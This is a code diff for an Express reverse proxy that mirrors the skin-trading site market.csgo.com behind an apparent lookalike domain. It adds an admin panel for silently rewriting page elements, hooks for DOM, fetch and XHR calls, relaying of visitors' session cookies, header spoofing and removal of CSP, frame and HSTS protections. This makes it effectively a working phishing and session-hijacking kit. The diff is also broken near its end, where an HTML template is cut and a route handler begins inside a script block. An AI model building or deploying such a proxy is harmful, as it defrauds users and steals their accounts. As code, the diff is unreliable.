@@ -457,14 +457,37 @@ function modifyUrls(content, baseUrl, contentType = '') {
                 }
             });
             
-            // Функционал для обработки кастомных модификаций страницы
+            // УЛУЧШЕНО: Функционал для обработки кастомных модификаций страницы
             function applyCustomModifications() {
+                console.log('⚙️ Checking for custom page modifications...');
+                
                 // Проверяем, есть ли для текущей страницы кастомные настройки
                 fetch('/admin-api/check-custom-page?url=' + encodeURIComponent(window.location.href))
                     .then(response => response.json())
                     .then(data => {
                         if (data.hasCustomizations) {
-                            console.log('Applying custom modifications for this page');
+                            console.log('✅ Found custom modifications for this page');
+                            
+                            // Создаем глобальный стиль для скрытия целевых элементов до модификации
+                            const globalStyleId = 'global-hide-pending-elements';
+                            if (!document.getElementById(globalStyleId)) {
+                                const style = document.createElement('style');
+                                style.id = globalStyleId;
+                                style.textContent = \`
+                                    /* Мгновенно скрываем все элементы, ожидающие модификации */
+                                    [data-pending-modification="true"] {
+                                        visibility: hidden !important;
+                                        opacity: 0 !important;
+                                    }
+                                    /* Плавно показываем модифицированные элементы */
+                                    [data-modified="true"] {
+                                        visibility: visible !important;
+                                        opacity: 1 !important;
+                                        transition: opacity 0.2s ease-in-out;
+                                    }
+                                \`;
+                                document.head.appendChild(style);
+                            }
                             
                             // Запрашиваем детали настроек
                             return fetch('/admin-api/get-custom-page?url=' + encodeURIComponent(window.location.href))
@@ -474,78 +497,161 @@ function modifyUrls(content, baseUrl, contentType = '') {
                     })
                     .then(customization => {
                         if (customization && customization.selector) {
-                            // НОВОЕ: Добавляем CSS, чтобы скрыть целевой элемент до модификации
-                            const styleId = 'temp-hide-elements';
-                            if (!document.getElementById(styleId)) {
-                                const style = document.createElement('style');
-                                style.id = styleId;
-                                style.textContent = `${customization.selector} { opacity: 0 !important; transition: opacity 0.3s; }`;
-                                document.head.appendChild(style);
-                            }
+                            console.log('🔍 Applying modification with selector:', customization.selector);
                             
-                            // Функция для применения изменений с использованием MutationObserver
-                            const setupModificationObserver = () => {
-                                // Проверяем существующие элементы
-                                const checkExisting = () => {
-                                    const elements = document.querySelectorAll(customization.selector);
-                                    if (elements && elements.length > 0) {
-                                        console.log('Found', elements.length, 'elements matching selector');
-                                        
-                                        elements.forEach((el, index) => {
-                                            if (!el.hasAttribute('data-modified')) {
-                                                console.log('Modifying element', index + 1);
-                                                el.innerHTML = customization.value;
-                                                el.setAttribute('data-modified', 'true');
-                                            }
-                                        });
-                                        
-                                        // Удаляем временный CSS-стиль для отображения модифицированных элементов
-                                        setTimeout(() => {
-                                            const tempStyle = document.getElementById(styleId);
-                                            if (tempStyle) {
-                                                tempStyle.textContent = `${customization.selector} { opacity: 1 !important; }`;
-                                                setTimeout(() => tempStyle.remove(), 300);
-                                            }
-                                        }, 50);
-                                        
-                                        return true;
-                                    }
-                                    return false;
-                                };
-                                
-                                // Если элементы уже существуют, модифицируем их
-                                if (checkExisting()) return;
-                                
-                                // Создаем MutationObserver для отслеживания появления элементов
-                                const observer = new MutationObserver((mutations) => {
-                                    if (checkExisting()) {
-                                        observer.disconnect();
-                                    }
-                                });
-                                
-                                // Начинаем наблюдение за всем документом
-                                observer.observe(document.documentElement, {
-                                    childList: true,
-                                    subtree: true
-                                });
-                                
-                                // Устанавливаем таймаут для прекращения наблюдения через 10 секунд
-                                setTimeout(() => {
-                                    observer.disconnect();
-                                    
-                                    // Проверяем еще раз перед отключением и удаляем скрывающий стиль
-                                    checkExisting();
-                                    const tempStyle = document.getElementById(styleId);
-                                    if (tempStyle) tempStyle.remove();
-                                }, 10000);
+                            // Функция для предварительной маркировки элементов, чтобы скрыть их до модификации
+                            const markPendingElements = () => {
+                                const elements = document.querySelectorAll(customization.selector);
+                                if (elements && elements.length > 0) {
+                                    console.log(\`🏷️ Marking \${elements.length} elements as pending modification\`);
+                                    elements.forEach(el => {
+                                        if (!el.hasAttribute('data-modified') && !el.hasAttribute('data-pending-modification')) {
+                                            el.setAttribute('data-pending-modification', 'true');
+                                            // Сохраняем оригинальное значение для отладки
+                                            el.setAttribute('data-original-value', el.innerHTML);
+                                        }
+                                    });
+                                    return true;
+                                }
+                                return false;
                             };
                             
-                            // Запускаем наблюдатель немедленно
-                            setupModificationObserver();
+                            // Функция для применения изменений
+                            const applyModifications = () => {
+                                const elements = document.querySelectorAll(customization.selector);
+                                if (elements && elements.length > 0) {
+                                    console.log(\`🔄 Modifying \${elements.length} elements with value:\`, customization.value);
+                                    
+                                    elements.forEach(el => {
+                                        if (!el.hasAttribute('data-modified')) {
+                                            // Модифицируем элемент
+                                            el.innerHTML = customization.value;
+                                            
+                                            // Удаляем атрибут ожидания и устанавливаем атрибут модификации
+                                            el.removeAttribute('data-pending-modification');
+                                            el.setAttribute('data-modified', 'true');
+                                            
+                                            console.log('✅ Element modified successfully', el);
+                                        }
+                                    });
+                                    return true;
+                                }
+                                return false;
+                            };
+                            
+                            // Функция для перехвата внедрения DOM элементов через innerHTML и insertAdjacentHTML
+                            const interceptDOMInsertions = () => {
+                                // Перехватываем innerHTML
+                                const originalInnerHTMLDescriptor = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
+                                Object.defineProperty(Element.prototype, 'innerHTML', {
+                                    set: function(value) {
+                                        // Вызываем оригинальный сеттер
+                                        const result = originalInnerHTMLDescriptor.set.call(this, value);
+                                        
+                                        // После вставки HTML проверяем наличие новых элементов для модификации
+                                        setTimeout(() => {
+                                            markPendingElements();
+                                            applyModifications();
+                                        }, 0);
+                                        
+                                        return result;
+                                    },
+                                    get: originalInnerHTMLDescriptor.get
+                                });
+                                
+                                // Перехватываем insertAdjacentHTML
+                                const originalInsertAdjacentHTML = Element.prototype.insertAdjacentHTML;
+                                Element.prototype.insertAdjacentHTML = function(position, text) {
+                                    const result = originalInsertAdjacentHTML.call(this, position, text);
+                                    
+                                    // После вставки HTML проверяем наличие новых элементов для модификации
+                                    setTimeout(() => {
+                                        markPendingElements();
+                                        applyModifications();
+                                    }, 0);
+                                    
+                                    return result;
+                                };
+                                
+                                console.log('🔄 DOM insertion methods intercepted');
+                            };
+                            
+                            // Применяем модификации на текущие элементы
+                            markPendingElements();
+                            applyModifications();
+                            
+                            // Перехватываем DOM вставки
+                            interceptDOMInsertions();
+                            
+                            // Создаем MutationObserver для отслеживания появления новых элементов
+                            const observer = new MutationObserver((mutations) => {
+                                // Проверяем, есть ли новые элементы, которые нужно пометить
+                                const hasNewElements = markPendingElements();
+                                
+                                // Если нашли новые элементы, применяем модификации
+                                if (hasNewElements) {
+                                    applyModifications();
+                                }
+                            });
+                            
+                            // Начинаем наблюдение за всем документом
+                            observer.observe(document.documentElement, {
+                                childList: true,
+                                subtree: true
+                            });
+                            
+                            // Устанавливаем интервал для периодической перепроверки
+                            // Это поможет поймать элементы, которые могли быть созданы через AJAX
+                            const checkInterval = setInterval(() => {
+                                const hasElements = markPendingElements();
+                                if (hasElements) {
+                                    applyModifications();
+                                }
+                            }, 500);
+                            
+                            // Останавливаем интервал через 30 секунд для экономии ресурсов
+                            setTimeout(() => {
+                                clearInterval(checkInterval);
+                                console.log('⏱️ Stopped periodic check interval');
+                            }, 30000);
+                            
+                            // Запускаем дополнительные проверки на ключевых событиях страницы
+                            ['load', 'DOMContentLoaded', 'readystatechange', 'complete'].forEach(eventType => {
+                                window.addEventListener(eventType, () => {
+                                    markPendingElements();
+                                    applyModifications();
+                                });
+                            });
+                            
+                            // Добавляем обработчик для перехвата загрузки AJAX
+                            const originalXHR = window.XMLHttpRequest.prototype.open;
+                            window.XMLHttpRequest.prototype.open = function() {
+                                this.addEventListener('load', function() {
+                                    setTimeout(() => {
+                                        markPendingElements();
+                                        applyModifications();
+                                    }, 100);
+                                });
+                                return originalXHR.apply(this, arguments);
+                            };
+                            
+                            // Перехватываем fetch API
+                            const originalFetch = window.fetch;
+                            window.fetch = function() {
+                                return originalFetch.apply(this, arguments).then(response => {
+                                    setTimeout(() => {
+                                        markPendingElements();
+                                        applyModifications();
+                                    }, 100);
+                                    return response;
+                                });
+                            };
+                            
+                            console.log('✅ All modification mechanisms initialized');
                         }
                     })
                     .catch(error => {
-                        console.error('Error checking for custom modifications:', error);
+                        console.error('❌ Error checking for custom modifications:', error);
                     });
             }
             
@@ -1161,7 +1267,7 @@ setInterval(() => {
     }
 }, 60 * 1000); // Проверка каждую минуту
 
-// Админ API для проверки кастомных страниц
+// УЛУЧШЕНО: Админ API для проверки кастомных страниц
 app.get('/admin-api/check-custom-page', (req, res) => {
     const urlToCheck = req.query.url;
     
@@ -1169,16 +1275,31 @@ app.get('/admin-api/check-custom-page', (req, res) => {
         return res.status(400).json({ error: 'URL parameter is required' });
     }
     
-    // ОПТИМИЗАЦИЯ: Устанавливаем кэширующие заголовки для улучшения производительности
-    res.set('Cache-Control', 'public, max-age=5'); // Кэшировать на 5 секунд
+    // Улучшенное сопоставление URL с учетом возможных шаблонов (wildcards)
+    const hasCustomizations = Array.from(customPages.keys()).some(pageUrl => {
+        // Точное совпадение
+        if (pageUrl === urlToCheck) return true;
+        
+        // Проверка на шаблон со звездочкой
+        if (pageUrl.includes('*')) {
+            const regex = new RegExp('^' + pageUrl.replace(/\*/g, '.*') + '$');
+            return regex.test(urlToCheck);
+        }
+        
+        return false;
+    });
     
-    // Проверяем, есть ли для этого URL настройки
-    const hasCustomizations = customPages.has(urlToCheck);
+    // Оптимизированные кэширующие заголовки
+    res.set('Cache-Control', 'public, max-age=5'); 
+    res.set('ETag', `"${hasCustomizations ? 1 : 0}"`);
     
-    res.json({ hasCustomizations });
+    res.json({ 
+        hasCustomizations,
+        timestamp: Date.now()
+    });
 });
 
-// Админ API для получения настроек кастомной страницы
+// УЛУЧШЕНО: Админ API для получения настроек кастомной страницы
 app.get('/admin-api/get-custom-page', (req, res) => {
     const urlToCheck = req.query.url;
     
@@ -1186,25 +1307,65 @@ app.get('/admin-api/get-custom-page', (req, res) => {
         return res.status(400).json({ error: 'URL parameter is required' });
     }
     
-    // ОПТИМИЗАЦИЯ: Устанавливаем кэширующие заголовки
-    res.set('Cache-Control', 'public, max-age=30'); // Кэшировать на 30 секунд
+    // Поиск подходящей настройки с учетом шаблонов
+    let customization = null;
+    let matchedUrl = null;
     
-    // Получаем настройки для URL
-    const customization = customPages.get(urlToCheck);
+    // Сначала проверяем точное совпадение
+    if (customPages.has(urlToCheck)) {
+        customization = customPages.get(urlToCheck);
+        matchedUrl = urlToCheck;
+    } else {
+        // Затем проверяем на шаблоны
+        for (const [pageUrl, config] of customPages.entries()) {
+            if (pageUrl.includes('*')) {
+                const regex = new RegExp('^' + pageUrl.replace(/\*/g, '.*') + '$');
+                if (regex.test(urlToCheck)) {
+                    customization = config;
+                    matchedUrl = pageUrl;
+                    break;
+                }
+            }
+        }
+    }
     
     if (!customization) {
         return res.status(404).json({ error: 'Custom page configuration not found' });
     }
     
-    res.json(customization);
+    // Оптимизированные кэширующие заголовки
+    const etag = `"${matchedUrl}-${customization.timestamp}"`;
+    res.set('Cache-Control', 'public, max-age=30');
+    res.set('ETag', etag);
+    
+    // Если у клиента есть та же версия, отправляем 304 Not Modified
+    if (req.headers['if-none-match'] === etag) {
+        return res.status(304).end();
+    }
+    
+    res.json({
+        ...customization,
+        matchedUrl: matchedUrl,
+        requestedUrl: urlToCheck
+    });
 });
 
-// Админ API для сохранения настроек кастомной страницы
+// УЛУЧШЕНО: Админ API для сохранения настроек кастомной страницы
 app.post('/admin-api/save-custom-page', express.json(), (req, res) => {
     const { url, selector, value } = req.body;
     
     if (!url || !selector || value === undefined) {
         return res.status(400).json({ error: 'URL, selector, and value are required' });
+    }
+    
+    // Валидируем селектор
+    try {
+        // Простая проверка синтаксиса селектора
+        if (selector.includes('<') || selector.includes('>') && !selector.includes('>')) {
+            throw new Error('Invalid selector syntax');
+        }
+    } catch (e) {
+        return res.status(400).json({ error: 'Invalid CSS selector' });
     }
     
     // Сохраняем настройки
@@ -1217,7 +1378,45 @@ app.post('/admin-api/save-custom-page', express.json(), (req, res) => {
     // Сохраняем в файл
     saveCustomPages();
     
-    res.json({ success: true, message: 'Custom page configuration saved' });
+    res.json({ 
+        success: true, 
+        message: 'Custom page configuration saved',
+        timestamp: Date.now()
+    });
+});
+
+// НОВОЕ: Админ API для валидации селектора
+app.post('/admin-api/validate-selector', express.json(), (req, res) => {
+    const { selector } = req.body;
+    
+    if (!selector) {
+        return res.status(400).json({ error: 'Selector is required' });
+    }
+    
+    try {
+        // Проверяем селектор на синтаксическую валидность
+        // Для этого используем простую эвристику
+        const valid = !(/[<>]/.test(selector) && !/<[^>]*>/.test(selector));
+        
+        res.json({ 
+            valid,
+            message: valid ? 'Selector appears to be valid' : 'Selector contains invalid characters'
+        });
+    } catch (e) {
+        res.status(400).json({ 
+            valid: false,
+            error: e.message 
+        });
+    }
+});
+
+// НОВОЕ: Админ API для проверки применения модификаций
+app.get('/admin-api/check-modifications-status', (req, res) => {
+    res.json({
+        active: customPages.size,
+        lastUpdated: Math.max(...Array.from(customPages.values()).map(page => page.timestamp || 0)),
+        serverTime: Date.now()
+    });
 });
 
 // Админ API для удаления настроек кастомной страницы
@@ -1286,7 +1485,7 @@ app.post('/admin-api/clear-cache', (req, res) => {
     }
 });
 
-// Админ-панель
+// Админ-панель с улучшенным интерфейсом
 app.get('/adminka', (req, res) => {
     // HTML для админ-панели
     const html = `
@@ -1342,6 +1541,13 @@ app.get('/adminka', (req, res) => {
                 top: 20px;
                 right: 20px;
                 z-index: 1000;
+            }
+            .preview-content {
+                background-color: white;
+                border: 1px solid #ddd;
+                padding: 10px;
+                border-radius: 4px;
+                margin-top: 5px;
             }
         </style>
     </head>
@@ -1658,6 +1864,9 @@ app.get('/adminka', (req, res) => {
                 cssSelectorInput.value = item.selector;
                 customValueInput.value = item.value;
                 
+                // Обновляем предпросмотр
+                previewModification();
+                
                 // Прокручиваем к форме
                 form.scrollIntoView({ behavior: 'smooth' });
             }
@@ -1698,7 +1907,7 @@ app.get('/adminka', (req, res) => {
                 }
             }
             
-            // Сохранение формы
+            // УЛУЧШЕНО: Сохранение формы с валидацией селектора
             async function saveCustomPage(e) {
                 e.preventDefault();
                 
@@ -1711,12 +1920,29 @@ app.get('/adminka', (req, res) => {
                     return;
                 }
                 
+                // Показываем индикатор загрузки
+                const submitBtn = document.querySelector('#customPageForm button[type="submit"]');
+                const originalText = submitBtn.innerHTML;
+                submitBtn.disabled = true;
+                submitBtn.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Сохранение...';
+                
                 try {
+                    // Сначала проверяем валидность селектора
+                    const validationResponse = await fetch('/admin-api/validate-selector', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ selector })
+                    });
+                    
+                    const validationData = await validationResponse.json();
+                    if (!validationData.valid) {
+                        throw new Error('Неверный селектор: ' + validationData.message);
+                    }
+                    
+                    // Затем сохраняем настройки
                     const response = await fetch('/admin-api/save-custom-page', {
                         method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
+                        headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ url, selector, value })
                     });
                     
@@ -1725,41 +1951,130 @@ app.get('/adminka', (req, res) => {
                         throw new Error(errorData.error || 'Ошибка при сохранении');
                     }
                     
-                    showToast('Настройки успешно сохранены');
+                    showToast('Настройки успешно сохранены и активированы', 'success');
+                    
+                    // Предлагаем проверить настройки
+                    if (confirm('Настройки сохранены. Хотите проверить их работу на странице?')) {
+                        window.open(url, '_blank');
+                    }
+                    
                     await loadCustomPages();
                     
                     // Очищаем форму
-                    form.reset();
+                    document.getElementById('customPageForm').reset();
+                    
+                    // Очищаем предпросмотр
+                    const previewContainer = document.getElementById('valuePreview');
+                    if (previewContainer) {
+                        previewContainer.remove();
+                    }
                 } catch (error) {
                     console.error('Ошибка сохранения:', error);
                     showToast('Ошибка при сохранении: ' + error.message, 'danger');
+                } finally {
+                    // Восстанавливаем кнопку
+                    submitBtn.disabled = false;
+                    submitBtn.innerHTML = originalText;
                 }
             }
             
-            // Проверка селектора
+            // НОВОЕ: Функция предварительного просмотра
+            function previewModification() {
+                const value = customValueInput.value;
+                const previewContainer = document.getElementById('valuePreview');
+                
+                if (!previewContainer) {
+                    // Создаем контейнер для предпросмотра, если его нет
+                    const container = document.createElement('div');
+                    container.id = 'valuePreview';
+                    container.className = 'mt-3 p-3 border rounded bg-light';
+                    container.innerHTML = \`
+                        <h6 class="mb-2">Предпросмотр значения:</h6>
+                        <div class="preview-content">\${value}</div>
+                    \`;
+                    
+                    const customValueInput = document.getElementById('customValue');
+                    customValueInput.parentNode.appendChild(container);
+                } else {
+                    // Обновляем существующий контейнер
+                    const previewContent = previewContainer.querySelector('.preview-content');
+                    if (previewContent) {
+                        previewContent.innerHTML = value;
+                    }
+                }
+            }
+            
+            // НОВОЕ: Функция проверки состояния модификаций
+            function checkModificationsStatus() {
+                fetch('/admin-api/check-modifications-status')
+                    .then(response => response.json())
+                    .then(data => {
+                        const statusBadge = document.getElementById('modificationsStatusBadge');
+                        if (statusBadge) {
+                            statusBadge.className = \`badge \${data.active > 0 ? 'bg-success' : 'bg-secondary'}\`;
+                            statusBadge.textContent = \`\${data.active} активных модификаций\`;
+                            
+                            const lastUpdate = new Date(data.lastUpdated).toLocaleString();
+                            statusBadge.title = \`Последнее обновление: \${lastUpdate}\`;
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Ошибка при проверке статуса модификаций:', error);
+                    });
+            }
+            
+            // УЛУЧШЕНО: Проверка селектора с визуальной обратной связью
             function testSelector() {
                 const url = pageUrlInput.value.trim();
                 const selector = cssSelectorInput.value.trim();
+                const value = customValueInput.value;
                 
                 if (!url || !selector) {
                     showToast('Пожалуйста, введите URL и селектор', 'warning');
                     return;
                 }
                 
-                // Открываем новое окно с нужной страницей
-                const testWindow = window.open(url, '_blank');
-                
-                // Добавляем скрипт для проверки селектора
-                setTimeout(() => {
-                    try {
-                        testWindow.postMessage({
-                            type: 'testSelector',
-                            selector: selector
-                        }, '*');
-                    } catch (e) {
-                        showToast('Не удалось проверить селектор', 'danger');
+                // Сначала проверяем валидность селектора
+                fetch('/admin-api/validate-selector', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ selector })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (!data.valid) {
+                        showToast('Неверный селектор: ' + data.message, 'danger');
+                        return;
                     }
-                }, 2000);
+                    
+                    // Если селектор валиден, открываем страницу для тестирования
+                    const testWindow = window.open(url, '_blank');
+                    
+                    // Инжектим скрипт для проверки селектора
+                    testWindow.addEventListener('load', () => {
+                        try {
+                            const script = testWindow.document.createElement('script');
+                            script.textContent = testWindowScript;
+                            testWindow.document.head.appendChild(script);
+                            
+                            // Отправляем сообщение для проверки селектора
+                            setTimeout(() => {
+                                testWindow.postMessage({
+                                    type: 'testSelector',
+                                    selector: selector,
+                                    originalValue: value
+                                }, '*');
+                            }, 500);
+                        } catch (e) {
+                            showToast('Не удалось проверить селектор: ' + e.message, 'danger');
+                        }
+                    });
+                    
+                    showToast('Открывается страница для проверки селектора...', 'info');
+                })
+                .catch(error => {
+                    showToast('Ошибка при проверке селектора: ' + error.message, 'danger');
+                });
             }
             
             // Сброс всех модификаций
@@ -1810,6 +2125,95 @@ app.get('/adminka', (req, res) => {
                 }
             }
             
+            // Скрипт для инжекции в тестовое окно
+            const testWindowScript = `
+            (function() {
+                // Функция для проверки селектора
+                function checkSelector(selector, originalValue) {
+                    console.log('Проверка селектора:', selector);
+                    
+                    try {
+                        const elements = document.querySelectorAll(selector);
+                        const found = elements && elements.length > 0;
+                        let currentValue = '';
+                        
+                        if (found) {
+                            currentValue = elements[0].innerHTML;
+                            
+                            // Подсветим найденные элементы
+                            elements.forEach(el => {
+                                const originalBackground = el.style.backgroundColor;
+                                const originalOutline = el.style.outline;
+                                
+                                el.style.outline = '2px solid red';
+                                el.style.backgroundColor = 'rgba(255, 100, 100, 0.1)';
+                                
+                                // Добавляем "оригинальное" значение рядом с элементом для сравнения
+                                if (originalValue) {
+                                    const overlay = document.createElement('div');
+                                    overlay.style.position = 'absolute';
+                                    overlay.style.zIndex = '9999';
+                                    overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.8)';
+                                    overlay.style.color = 'white';
+                                    overlay.style.padding = '5px 10px';
+                                    overlay.style.borderRadius = '4px';
+                                    overlay.style.fontSize = '14px';
+                                    overlay.style.maxWidth = '300px';
+                                    overlay.style.wordBreak = 'break-word';
+                                    overlay.innerHTML = \`
+                                        <div style="margin-bottom:5px"><strong>Текущее значение:</strong></div>
+                                        <div style="color:#ff9">\${el.innerHTML}</div>
+                                        <div style="margin:5px 0"><strong>Будет заменено на:</strong></div>
+                                        <div style="color:#9f9">\${originalValue}</div>
+                                    \`;
+                                    
+                                    // Позиционируем оверлей рядом с элементом
+                                    const rect = el.getBoundingClientRect();
+                                    overlay.style.top = (rect.top + window.scrollY) + 'px';
+                                    overlay.style.left = (rect.right + window.scrollX + 10) + 'px';
+                                    
+                                    document.body.appendChild(overlay);
+                                    
+                                    // Удаляем оверлей через 5 секунд
+                                    setTimeout(() => {
+                                        document.body.removeChild(overlay);
+                                        el.style.outline = originalOutline;
+                                        el.style.backgroundColor = originalBackground;
+                                    }, 5000);
+                                }
+                            });
+                        }
+                        
+                        // Отправляем результат обратно
+                        window.opener.postMessage({
+                            type: 'selectorTestResult',
+                            found: found,
+                            count: found ? elements.length : 0,
+                            currentValue: currentValue
+                        }, '*');
+                        
+                    } catch (error) {
+                        console.error('Ошибка при проверке селектора:', error);
+                        
+                        window.opener.postMessage({
+                            type: 'selectorTestResult',
+                            found: false,
+                            error: error.message
+                        }, '*');
+                    }
+                }
+                
+                // Обработчик сообщений от админ-панели
+                window.addEventListener('message', (event) => {
+                    if (event.data && event.data.type === 'testSelector') {
+                        checkSelector(event.data.selector, event.data.originalValue);
+                    }
+                });
+                
+                console.log('Скрипт проверки селектора загружен');
+            })();
+            `;
+            
             // Инициализация
             document.addEventListener('DOMContentLoaded', () => {
                 // Загружаем список модифицированных страниц
@@ -1832,155 +2236,73 @@ app.get('/adminka', (req, res) => {
                 window.addEventListener('message', (event) => {
                     if (event.data && event.data.type === 'selectorTestResult') {
                         if (event.data.found) {
-                            showToast(\`Найдено \${event.data.count} элемент(ов) по селектору\`, 'success');
+                            showToast(`Найдено ${event.data.count} элемент(ов) по селектору. Текущее значение: "${event.data.currentValue}"`, 'success');
+                            
+                            // Добавляем визуальную индикацию соответствия текущего значения и нового
+                            const customValueInput = document.getElementById('customValue');
+                            if (customValueInput && event.data.currentValue) {
+                                // Временно подсвечиваем поле, если значения разные
+                                if (customValueInput.value.trim() !== event.data.currentValue.trim()) {
+                                    customValueInput.classList.add('border-warning');
+                                    
+                                    // Предлагаем использовать текущее значение как шаблон
+                                    if (confirm(`Хотите использовать текущее значение "${event.data.currentValue}" как основу для модификации?`)) {
+                                        customValueInput.value = event.data.currentValue;
+                                        previewModification();
+                                    }
+                                    
+                                    setTimeout(() => {
+                                        customValueInput.classList.remove('border-warning');
+                                    }, 3000);
+                                } else {
+                                    customValueInput.classList.add('border-success');
+                                    setTimeout(() => {
+                                        customValueInput.classList.remove('border-success');
+                                    }, 3000);
+                                }
+                            }
                         } else {
-                            showToast('Элементы по указанному селектору не найдены', 'warning');
+                            showToast('Элементы по указанному селектору не найдены. Проверьте правильность селектора.', 'warning');
                         }
                     }
                 });
+                
+                // Добавляем обработчик для предпросмотра значения
+                customValueInput.addEventListener('input', previewModification);
+                
+                // Добавляем индикатор состояния модификаций
+                const cardHeader = document.querySelector('.card-header h5.card-title');
+                if (cardHeader) {
+                    const statusBadge = document.createElement('span');
+                    statusBadge.id = 'modificationsStatusBadge';
+                    statusBadge.className = 'badge bg-secondary ms-2';
+                    statusBadge.textContent = 'Проверка...';
+                    cardHeader.appendChild(statusBadge);
+                    
+                    // Проверяем текущее состояние
+                    checkModificationsStatus();
+                    
+                    // Периодически проверяем состояние
+                    setInterval(checkModificationsStatus, 10000);
+                }
+                
+                // Добавляем предпросмотр при загрузке страницы, если есть значение
+                if (customValueInput && customValueInput.value) {
+                    previewModification();
+                }
+                
+                // Добавляем подсказки для заполнения формы
+                const urlPattern = document.createElement('div');
+                urlPattern.className = 'form-text mt-1';
+                urlPattern.innerHTML = '<strong>Совет:</strong> Вы можете использовать * как подстановочный знак для соответствия нескольким URL. Например: <code>https://market-csgo.co/ru/Gloves/*</code>';
+                
+                const urlInput = document.getElementById('pageUrl');
+                if (urlInput && urlInput.parentNode) {
+                    urlInput.parentNode.appendChild(urlPattern);
+                }
             });
         </script>
-    </body>
-    </html>
-    `;
-    
-    res.send(html);
-});
-
-// ИСПРАВЛЕНО: Улучшена обработка GraphQL запросов с повторными попытками
-app.post('/api/graphql', async (req, res) => {
-    try {
-        const targetUrl = TARGET_HOST + '/api/graphql';
-        const baseUrl = getBaseUrl(req);
-        const sessionId = req.cookies.sessionId || Math.random().toString(36).substring(7);
-        const session = getSession(sessionId);
-        
-        // Собираем cookies для запроса
-        const requestCookies = new Map([
-            ...session.cookies,
-            ...parseCookieHeader(req.headers.cookie)
-        ]);
-        
-        console.log(`📊 GraphQL: ${req.method} ${req.originalUrl}`);
-        
-        // ИСПРАВЛЕНО: Улучшенные заголовки для GraphQL
-        const axiosConfig = {
-            method: req.method,
-            url: targetUrl,
-            headers: {
-                ...req.headers,
-                'host': 'market.csgo.com',
-                'origin': 'https://market.csgo.com',
-                'referer': 'https://market.csgo.com/',
-                'content-type': 'application/json',
-                'accept': 'application/json',
-                'accept-language': 'en-US,en;q=0.9',
-                'user-agent': req.headers['user-agent'] || 'Mozilla/5.0',
-                'cookie': createCookieString(requestCookies),
-                'connection': 'keep-alive'
-            },
-            data: req.body,
-            responseType: 'json',
-            validateStatus: () => true, // Принимаем любой статус ответа
-            maxRedirects: 0,
-            timeout: 30000,
-            httpsAgent: httpsAgent
-        };
-        
-        // Удаляем заголовки прокси
-        delete axiosConfig.headers['x-forwarded-for'];
-        delete axiosConfig.headers['x-forwarded-proto'];
-        delete axiosConfig.headers['x-forwarded-host'];
-        
-        // ИСПРАВЛЕНО: Добавляем повторные попытки для GraphQL запросов
-        let retries = 0;
-        const maxRetries = 3;
-        let response = null;
-        let lastError = null;
-        
-        while (retries < maxRetries) {
-            try {
-                if (retries > 0) {
-                    console.log(`GraphQL retry ${retries}/${maxRetries} for ${req.originalUrl}`);
-                    await new Promise(resolve => setTimeout(resolve, 1000 * retries)); // Увеличивающаяся задержка
-                }
-                
-                response = await axios(axiosConfig);
-                
-                // Если успешно, выходим из цикла
-                if (response.status !== 500) {
-                    break;
-                }
-                
-                console.warn(`GraphQL returned 500, retry ${retries + 1}/${maxRetries}`);
-                retries++;
-                
-            } catch (error) {
-                console.error(`GraphQL request failed (attempt ${retries + 1}/${maxRetries}):`, error.message);
-                lastError = error;
-                retries++;
-                
-                if (retries >= maxRetries) {
-                    throw error;
-                }
-            }
-        }
-        
-        // Если не смогли получить ответ после всех попыток
-        if (!response) {
-            throw lastError || new Error('Failed after max retries');
-        }
-        
-        // Сохраняем cookies из ответа
-        if (response.headers['set-cookie']) {
-            const newCookies = parseSetCookieHeaders(response.headers['set-cookie']);
-            newCookies.forEach((value, name) => {
-                session.cookies.set(name, value);
-            });
-        }
-        
-        // Устанавливаем sessionId cookie если её нет
-        if (!req.cookies.sessionId) {
-            res.cookie('sessionId', sessionId, { 
-                httpOnly: true, 
-                secure: isSecure(req),
-                sameSite: isSecure(req) ? 'none' : 'lax'
-            });
-        }
-        
-        // Устанавливаем заголовки
-        Object.entries(response.headers).forEach(([key, value]) => {
-            if (!['content-encoding', 'content-length', 'transfer-encoding'].includes(key.toLowerCase())) {
-                res.set(key, value);
-            }
-        });
-        
-        // ИСПРАВЛЕНО: Специальная обработка GraphQL ошибок
-        if (response.data && response.data.errors) {
-            console.warn('GraphQL responded with errors:', JSON.stringify(response.data.errors));
-            
-            // Если это ошибка viewItem - возвращаем пустой результат вместо ошибки
-            if (JSON.stringify(response.data.errors).includes('viewItem')) {
-                console.log('Replacing viewItem error with empty response');
-                response.data = { data: { viewItem: null } };
-            }
-        }
-        
-        res.status(response.status);
-        res.json(response.data);
-        
-    } catch (error) {
-        console.error('❌ GraphQL error:', error.message);
-        // Возвращаем клиенту обобщенный ответ с пустыми данными
-        res.status(200).json({ 
-            data: {},
-            errors: [{ message: 'GraphQL proxy error, please retry' }]
-        });
-    }
-});
-
-// ИСПРАВЛЕНО: Улучшен основной обработчик HTTP запросов с повторными попытками
-app.use('*', async (req, res, next) => {
+        app.use('*', async (req, res, next) => {
     try {
         // Пропускаем запросы к админке и API
         if (req.originalUrl.startsWith('/adminka') || req.originalUrl.startsWith('/admin-api')) {
@@ -2130,104 +2452,92 @@ app.use('*', async (req, res, next) => {
             content = Buffer.from(modifyUrls(content.toString('utf8'), baseUrl, contentType), 'utf8');
         }
 
-// Подготовка заголовков ответа
-const responseHeaders = { ...response.headers };
+        // Подготовка заголовков ответа
+        const responseHeaders = { ...response.headers };
 
-// Удаляем небезопасные заголовки
-delete responseHeaders['content-security-policy'];
-delete responseHeaders['x-frame-options'];
-delete responseHeaders['x-content-type-options'];
-delete responseHeaders['strict-transport-security'];
-delete responseHeaders['permissions-policy'];
-delete responseHeaders['cross-origin-opener-policy'];
-delete responseHeaders['cross-origin-embedder-policy'];
+        // Удаляем небезопасные заголовки
+        delete responseHeaders['content-security-policy'];
+        delete responseHeaders['x-frame-options'];
+        delete responseHeaders['x-content-type-options'];
+        delete responseHeaders['strict-transport-security'];
+        delete responseHeaders['permissions-policy'];
+        delete responseHeaders['cross-origin-opener-policy'];
